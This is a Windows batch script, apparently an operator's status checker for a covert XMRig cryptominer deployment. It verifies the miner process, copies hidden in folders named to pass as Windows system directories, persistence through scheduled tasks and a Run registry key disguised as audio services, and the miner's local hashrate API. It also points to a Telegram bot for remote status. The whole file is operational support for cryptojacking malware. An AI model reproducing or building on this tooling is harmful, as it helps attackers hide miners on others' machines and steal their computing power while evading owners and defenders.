@echo off
title Quick Status Check
echo =====================================================
echo    BEAST MODE ULTIMATE - STATUS CHECK
echo =====================================================
echo.

echo [1] Checking XMRig Process...
tasklist /fi "imagename eq xmrig.exe" | find /i "xmrig.exe" >nul
if %errorlevel%==0 (
    echo ✅ XMRig is running
    for /f "tokens=2" %%i in ('tasklist /fi "imagename eq xmrig.exe" ^| find /i "xmrig.exe"') do echo    Process ID: %%i
) else (
    echo ❌ XMRig is NOT running
)
echo.

echo [2] Checking Process Count...
for /f %%i in ('tasklist /fi "imagename eq xmrig.exe" ^| find /c "xmrig.exe"') do (
    if %%i==1 (
        echo ✅ Single instance confirmed %%i process
    ) else if %%i==0 (
        echo ❌ No processes running
    ) else (
        echo ⚠️  Multiple instances detected: %%i processes
    )
)
echo.

echo [3] Checking Deployment Locations...
set count=0
for %%L in ("C:\ProgramData\Microsoft\Windows\WindowsUpdate" "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv" "C:\ProgramData\Microsoft\Network\Downloader") do (
    if exist "%%L\xmrig.exe" (
        echo ✅ Found at: %%L
        set /a count+=1
    )
)
echo    Total locations: %count%/3 main locations
echo.

echo [4] Checking Scheduled Tasks...
schtasks /query /tn "WindowsAudioSrv" >nul 2>&1
if %errorlevel%==0 (echo ✅ Startup task exists) else (echo ❌ Startup task missing)

schtasks /query /tn "SystemHostAudio" >nul 2>&1  
if %errorlevel%==0 (echo ✅ Logon task exists) else (echo ❌ Logon task missing)
echo.

echo [5] Checking Registry Entries...
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudioService" >nul 2>&1
if %errorlevel%==0 (echo ✅ Registry startup entry exists) else (echo ❌ Registry startup missing)
echo.

echo [6] Checking API Connection...
powershell -Command "try { $response = Invoke-RestMethod -Uri 'http://127.0.0.1:16000/1/summary' -TimeoutSec 3; if ($response.hashrate.total) { Write-Host '✅ API accessible - Hashrate:' $response.hashrate.total[0] 'H/s' } else { Write-Host '⚠️ API accessible but no hashrate data' } } catch { Write-Host '❌ API not accessible' }"
echo.

echo [7] Checking CPU Usage...
powershell -Command "try { $cpu = (Get-Counter '\Processor(_Total)\% Processor Time' -SampleInterval 1 -MaxSamples 1).CounterSamples.CookedValue; Write-Host '📊 CPU Usage:' ([math]::Round($cpu,1))'%' } catch { Write-Host '❌ Cannot read CPU usage' }"
echo.

echo =====================================================
echo Status check complete. 
echo Send "/status beast2025" via Telegram for detailed info.
echo =====================================================
pause
